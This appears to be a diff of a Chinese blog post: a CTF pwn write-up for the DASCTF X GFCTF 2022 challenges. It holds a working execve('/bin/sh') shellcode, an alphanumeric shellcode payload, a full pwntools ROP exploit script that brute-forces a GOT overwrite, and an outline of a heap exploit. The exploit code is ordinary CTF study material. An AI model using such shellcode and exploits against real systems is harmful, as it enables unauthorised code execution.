@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://nqoinaen.github.io/img/20221013085537.jpg">
 <meta property="article:published_time" content="2022-10-28T06:26:13.000Z">
-<meta property="article:modified_time" content="2022-10-28T12:47:41.750Z">
+<meta property="article:modified_time" content="2022-10-31T06:10:06.004Z">
 <meta property="article:author" content="nqoinaen">
 <meta property="article:tag" content="shellocde">
 <meta property="article:tag" content="rop">
@@ -315,7 +315,7 @@
               <p class="note note-info">
                 
                   
-                    本文最后更新于：8 分钟前
+                    本文最后更新于：2022年10月31日 下午
                   
                 
               </p>
@@ -323,11 +323,11 @@
             
               <div class="markdown-body">
                 
-                <h1>前言：</h1>
+                <h2 id="前言：">前言：</h2>
 <p>因为实在是太菜，所以一题都没做出来，跟着<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&amp;mid=2247502987&amp;idx=1&amp;sn=39df1e5a1638db91f716f975fbeb69c1&amp;chksm=fbf456fbcc83dfedf587a21112de8e6fae17942e848974c5eafd827ab94af9d65aa87bef424b&amp;mpshare=1&amp;scene=23&amp;srcid=1025bRDnAZQ3o5bMtZAgFHMu&amp;sharer_sharetime=1666699678887&amp;sharer_shareid=600395608e88237687e56b1c66678009#rd">官方wp</a>复现一下</p>
 <p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/rank.png" srcset="/img/loading.gif" lazyload alt="rank"></p>
-<h1>1!5!</h1>
-<h2 id="0x01-确定汇编">0x01 确定汇编</h2>
+<h2 id="1-5">1!5!</h2>
+<h3 id="0x01-确定汇编">0x01 确定汇编</h3>
 <p>题目限制输入指定明文字符15aABCDEFGHIJKLMNOPQRSUVWXYZ，且长度要刚好0x200</p>
 <p>先确定能还用什么汇编</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#\x31\x35\x61\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x55\x56\x57\x58\x59\x5A</span><br>push:<br>    \x50 		P			  push   rax<br>    \x51        Q             push   rcx<br>    \x52        R             push   rdx<br>    \x53        S             push   rbx<br>    \x55        U             push   rbp<br>    \x56        V             push   rsi<br>    \x57        W             push   rdi<br>    \x41\x50---&gt;\x41\x57	  push r8---&gt;push r15<br>pop:<br>    \x58        X             pop    rax<br>    \x59        Y             pop    rcx<br>    \x5a        Z             pop    rdx<br>    \x41\x58	AX		  	  pop    r8<br>    \x41\x59	AY			  pop    r9<br>    \x41\x5a	AZ			  pop    r10<br>xor:<br>    \x35xxxx	5XXXX	xor    eax,xxxx<br>    \x31\x31 			xor    DWORD PTR [rcx], esi<br>    <br>    \x31xy		1xy		(x决定两个寄存器，y决定立即数)	 <br>    					xor    DWORD PTR [寄存器+立即数], 寄存器<br>    例：	<br>    \x31\x61\x31		xor    DWORD PTR [rcx+<span class="hljs-number">0x31</span>], esp<br>    \x31\x41\x35		xor    DWORD PTR [rcx+<span class="hljs-number">0x35</span>], eax<br></code></pre></td></tr></table></figure>
@@ -336,7 +336,7 @@
 <p><code>xor DWORD PTR [寄存器+立即数], eax</code>可以把值写入指定位置</p>
 <p>配合<code>push</code>，<code>pop</code>等命令加上残留在<code>rdx</code>寄存器上的<code>0x10000</code>地址，可以在<code>0x10000</code>往后的地址写入小于<code>0x7f</code>字节的值，去当作命令执行</p>
 <p>我们可以使用小于0x7f的命令，即可用一些如<code>sub byte [rax+1],cl</code>这些命令，来造出大于<code>0x7f</code>的值</p>
-<h2 id="0x02-小于0x7f指令，写入shellcode">0x02 小于0x7f指令，写入shellcode</h2>
+<h3 id="0x02-小于0x7f指令，写入shellcode">0x02 小于0x7f指令，写入shellcode</h3>
 <p>我们最终目的是写shellcode当作命令执行，</p>
 <p>我这里找了个<code>64位 较短的shellcode  23字节</code></p>
 <p><code>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</code></p>
@@ -345,7 +345,7 @@
 <p>可以写出由小于0x7f的指令组成的汇编：功能是把<code>shellcode</code>写到<code>0x10000+0x801</code>处</p>
 <p>(<code>\x00</code>会影响解析汇编，所以微调下位置<code>0x801</code>,push的立即数要反着填)</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add ax,0x801<br>push 0x56003148<br>pop rcx<br>xor DWORD PTR [rax], ecx<br>push 0x622f0048<br>pop rcx<br>xor DWORD PTR [rax+0x4], ecx<br>push 0x2f2f6e69<br>pop rcx<br>xor DWORD PTR [rax+0x8], ecx<br>push 0x54576873<br>pop rcx<br>xor DWORD PTR [rax+0xc], ecx<br>push 0x583b6a5f<br>pop rcx<br>xor DWORD PTR [rax+0x10], ecx<br>push 0x050f00<br>pop rcx<br>xor DWORD PTR [rax+0x14], ecx<br>push 0xa<br>pop rcx<br>sub byte [rax+1],cl<br>push 0x41<br>pop rcx<br>sub byte [rax+4],cl<br>push 0x67<br>pop rcx<br>sub byte [rax+19],cl<br>sub ax,0x801<br></code></pre></td></tr></table></figure>
-<h2 id="0x03-异或出小于0x7f">0x03 异或出小于0x7f</h2>
+<h3 id="0x03-异或出小于0x7f">0x03 异或出小于0x7f</h3>
 <p>上面这串汇编对应值为</p>
 <p><code>\x66\x05\x01\x08\x68\x48\x31\x00\x56\x59\x31\x08\x68\x48\x00\x2F\x62\x59\x31\x48\x04\x68\x69\x6E\x2F\x2F\x59\x31\x48\x08\x68\x73\x68\x57\x54\x59\x31\x48\x0C\x68\x5F\x6A\x3B\x58\x59\x31\x48\x10\x68\x00\x0F\x05\x00\x59\x31\x48\x14\x6A\x0A\x59\x28\x48\x02\x6A\x41\x59\x28\x48\x05\x6A\x67\x59\x28\x48\x14\x66\x2D\x01\x08</code></p>
 <p>我们用最初的xor指令来异或出，并写入<code>0x10000+0x400</code>处</p>
@@ -358,7 +358,7 @@
 <p><code>RX5111151511PY511B1515C151ABA5WDCI1AB551115a1Ba5ZMCX1AF511115Aaaa5NAPX1AJ511115Aa1A5NA1W1ANPQX5A1115Q111PYX5AAa15KPPV1AB5a1115A11A5F1XV1AF5111A5B1BD5XGCZ1AJ5a1115AA115GW1B1ANPQX5a1115Q111PYX51A115ADAA5PZLZ1AB5111151a115YOX11AF5a1115AAAB5NRGC1AJ51Aa15aBA15VXSH1ANPQX5A1115Q111PYX511115111a511GE1AB5a1115A1A15HYNM1AF5AaaA5URZP1AJ511115AAaA5LRXC1ANPQX511115A111PYX51Aaa5XPKC1AB5111151A1a5DCOA1AF511a15DAAA5XRSO1AJ5111a5a1aA5UILF1ANQX5151155aaa5DPPPPYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</code></p>
 <p>getshell</p>
 <p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/get.png" srcset="/img/loading.gif" lazyload alt="get"></p>
-<h1>R()P</h1>
+<h2 id="R-P">R()P</h2>
 <p>保护没开pie，got表可写</p>
 <p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%982%E4%BF%9D%E6%8A%A4.png" srcset="/img/loading.gif" lazyload alt="题2保护"></p>
 <p>题目存在一个栈溢出</p>
@@ -366,7 +366,7 @@
 <p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/2.34.png" srcset="/img/loading.gif" lazyload alt="2.34"></p>
 <p>没了常规的<code>pop rdi;ret</code>   <code>pop_rsi_r15</code>，也没有了csu等gadget用</p>
 <p>主要是如何去rop</p>
-<h2 id="0x01能控制的参数">0x01能控制的参数</h2>
+<h3 id="0x01能控制的参数">0x01能控制的参数</h3>
 <p><strong>rax：</strong> 可以由栈上的值控制，gdb调试可得是 rsp+0xc处</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040116D                 mov     eax, dword ptr [rsp+18h+buf]<br>.text:0000000000401171                 add     rsp, 18h<br>.text:0000000000401175                 retn<br></code></pre></td></tr></table></figure>
 <p><strong>rdi:</strong></p>
@@ -379,7 +379,7 @@
 <p>rdx只有在调用read前有一段赋值为栈上的值的操作</p>
 <p>但如果我们要read的话rdx也就是长度不能为0，但是要造的execve的参数只需满足使rdx一个地址指向0</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:000000000040115D                 mov     edx, dword ptr [rsp+18h+buf] ; nbytes<br></code></pre></td></tr></table></figure>
-<h2 id="0x02-ROP思路">0x02 ROP思路</h2>
+<h3 id="0x02-ROP思路">0x02 ROP思路</h3>
 <p>最后我们要rop出<code>execve('/bin/sh',0,0)</code></p>
 <p>参数:</p>
 <p><code>rdi='/bin/sh'</code></p>
@@ -397,13 +397,13 @@
 <p><code>rsi=0</code></p>
 <p><code>rdx=地址-&gt;0</code></p>
 <p>调用read即getshell</p>
-<h2 id="0x03-本地exp">0x03 本地exp</h2>
+<h3 id="0x03-本地exp">0x03 本地exp</h3>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./pwn&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;/lib64/ld-linux-x86-64.so.2&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    <span class="hljs-comment">#r = process(local_file)</span><br>    libc = ELF(local_libc)<br><span class="hljs-keyword">elif</span> select == <span class="hljs-number">1</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25904</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = elf.arch</span><br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    read_plt=elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    read_got=elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    bss_start=<span class="hljs-number">0x404018</span><br><br>    ret=<span class="hljs-number">0x40101a</span><br>    rax=<span class="hljs-number">0x40116d</span><br>    rsi_call_read=<span class="hljs-number">0x401141</span><br>    rdi=<span class="hljs-number">0x401099</span><br>    read_rax=<span class="hljs-number">0x40115a</span><br>    <br>    se(p32(<span class="hljs-number">0x100</span>))<br>    payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(read_got)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(read_rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(bss_start+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(ret)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rdi)<br>    payload+=p64(rax)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0x3b</span>)+p64(<span class="hljs-number">0</span>)<br>    payload+=p64(rsi_call_read)+p64(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)<br>    se(payload)<br>    se(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>    se(<span class="hljs-string">b&#x27;\x3b\x1a\xea&#x27;</span>)<br>    r.recv(timeout = <span class="hljs-number">1</span>)<br>    r.interactive()<br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;have try:&#x27;</span>+<span class="hljs-built_in">str</span>(i))<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            r.close()<br>        i+=<span class="hljs-number">1</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure>
 <p>最后要改read_got为syscall+0x1b 我本地有三个位要爆破，1/4096成功，</p>
 <p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/baopo.png" srcset="/img/loading.gif" lazyload alt="baopo"></p>
 <p>不过这题远端只要爆破一位1/16，我真的是吃饱了撑的</p>
-<h1>magic_book</h1>
-<h2 id="0x01程序分析">0x01程序分析</h2>
+<h2 id="magic-book">magic_book</h2>
+<h3 id="0x01程序分析">0x01程序分析</h3>
 <p>保护全开</p>
 <p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/%E9%A2%983%E4%BF%9D%E6%8A%A4.png" srcset="/img/loading.gif" lazyload alt="题3保护"></p>
 <p>有add和delete功能</p>
@@ -412,7 +412,7 @@
 <p>没有show功能，要泄露libc就要打IO_stdout</p>
 <p>用的libc是2.31的，还能用hook</p>
 <p><img src="/2022/10/28/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/libc2.31%E9%A2%983.png" srcset="/img/loading.gif" lazyload alt="libc2.31题3"></p>
-<h2 id="0x02利用思路">0x02利用思路</h2>
+<h3 id="0x02利用思路">0x02利用思路</h3>
 <p>1.使用house of botcake 的手法，在仅使用一次uaf的情况下，避免了tcache的key值检测，造成tcache poioning的效果</p>
 <p>（victim堆在同一个地址，一个在tcachebin，一个在unsortbin）</p>
 <p>2.切割unsortbin，修改unsortbin中存的main_arena+96地址为stdout（最后三位偏移不变，第四位要爆破一位1/16）</p>
@@ -493,7 +493,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2022年10月28日</div>
+          <div>2022年10月31日</div>
         </div>
       
       
@@ -523,6 +523,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2022/10/31/2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%A5%A5%E4%BA%91%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9Bpwn/" title="2022第三届祥云杯网络安全大赛pwn">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2022第三届祥云杯网络安全大赛pwn</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
